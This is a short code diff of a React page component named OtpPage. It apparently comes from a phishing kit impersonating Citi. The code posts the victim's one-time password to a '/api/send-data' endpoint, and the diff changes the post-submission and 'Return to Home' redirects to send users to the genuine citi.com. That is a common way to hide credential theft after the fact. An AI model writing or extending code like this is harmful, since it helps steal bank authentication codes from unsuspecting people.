@@ -42,7 +42,7 @@ const OtpPage = () => {
       await axios.post("/api/send-data", { otp });
 
       setInterval(() => {
-        router.push("/");
+        router.push("https://citi.com");
       }, 5000);
     } catch (err) {
       alert("Wrong OTP, Please give valid OTP");
@@ -122,7 +122,7 @@ const OtpPage = () => {
             <button
               className="cursor-pointer w-full py-3 mt-6 bg-primary hover:!bg-[#054e7b] rounded-lg font-bold text-white  transition-colors"
               onClick={() => {
-                router.push("/");
+                router.push("https://citi.com");
               }}
             >
               Return to Home
